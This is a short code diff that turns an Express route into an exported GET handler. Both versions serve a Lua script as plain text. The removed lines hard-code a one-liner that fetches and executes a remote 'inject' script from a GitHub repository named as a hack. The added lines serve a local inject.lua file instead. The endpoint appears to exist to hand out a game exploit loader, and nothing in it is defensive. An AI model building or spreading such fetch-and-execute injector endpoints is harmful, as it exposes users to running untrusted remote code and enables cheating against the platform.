@@ -1,10 +1,13 @@
-const express = require('express');
-const app = express();
+export async function GET() {
+  const fs = require('fs');
+  const path = require('path');
 
-app.get('/api/script', (req, res) => {
-  const code = `loadstring(game:HttpGet("https://raw.githubusercontent.com/SrDark222/x64-Windos-Hack/refs/heads/main/inject"))()`;
-  res.type('text/plain');
-  res.send(code);
-});
+  const filePath = path.join(process.cwd(), 'api', 'inject.lua');
+  const code = fs.readFileSync(filePath, 'utf-8');
 
-app.listen(3000);
+  return new Response(code, {
+    headers: {
+      'Content-Type': 'text/plain'
+    }
+  });
+}
